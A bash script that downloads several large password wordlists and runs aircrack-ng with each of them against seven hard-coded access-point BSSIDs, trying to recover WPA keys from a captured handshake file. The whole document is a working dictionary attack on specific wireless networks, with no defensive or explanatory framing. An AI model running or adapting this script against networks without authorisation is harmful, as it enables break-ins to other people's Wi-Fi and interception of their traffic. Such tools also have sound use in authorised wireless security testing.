#!/bin/bash
WORDLISTS="/root/wordlists/"
bssids=( "24:65:11:EA:5E:FC" "C8:0E:14:32:84:F5" "24:65:11:BD:3B:8D" "5C:49:79:21:AF:A1" "5C:49:79:57:FB:73" "9C:C7:A6:FC:D7:C2" "34:81:C4:B8:F0:03" )

if [ ! -d $WORDLISTS ]
	then
		echo "wordlist directory is missing creating it now" 
		mkdir /root/wordlists
		
		echo "Downloading wordlists"
		cd $WORDLISTS
		wget http://sec.stanev.org/dict/hashes_org.txt.gz
		gunzip hashes_org.txt.gz
		rm -f hashes_org.txt.gz
		wget http://sec.stanev.org/dict/os.txt.gz
		gunzip os.txt.gz
		rm -f os.txt.gz
		wget http://sec.stanev.org/dict/used.txt.gz
		gunzip used.txt.gz
		rm -f used.txt.gz
		wget http://sec.stanev.org/dict/wp_de.txt.gz
		gunzip wp_de.txt.gz
		rm -f wp_de.txt.gz
		wget http://sec.stanev.org/dict/wp.txt.gz
		gunzip wp.txt.gz
		rm -f wp.txt.gz
		wget http://sec.stanev.org/dict/insidepro.txt.gz
		gunzip insidepro.txt.gz
		rm -f insidepro.txt.gz
		wget http://sec.stanev.org/dict/openwall.txt.gz
		gunzip openwall.txt.gz
		rm -f openwall.txt.gz
		
		wget -c http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
		bzip2 -d rockyou.txt.bz2
		rm -f rockyou.txt.bz2
		wget http://downloads.skullsecurity.org/passwords/german.txt.bz2
		bzip2 -d german.txt.bz2
		rm -f german.txt.bz2
		
		wget http://www.lostpassword.com/f/wl/German.zip
		unzip German.zip
		rm -f German.zip
fi

ls -1 -S -r $WORDLISTS > listsfile
readarray lists < listsfile

#aircrack-ng all.cap > bssid_out&
#sleep 1
#killall aircrack-ng

for list in "${lists[@]}"
do
   : 
	for bssid in "${bssids[@]}"
	do
		: 
	echo "cracking"+$bssid+" with wordlist"+$list
	aircrack-ng -w $WORDLISTS$list -b $bssid -q -l $bssid wpa.cap
	done
done
  
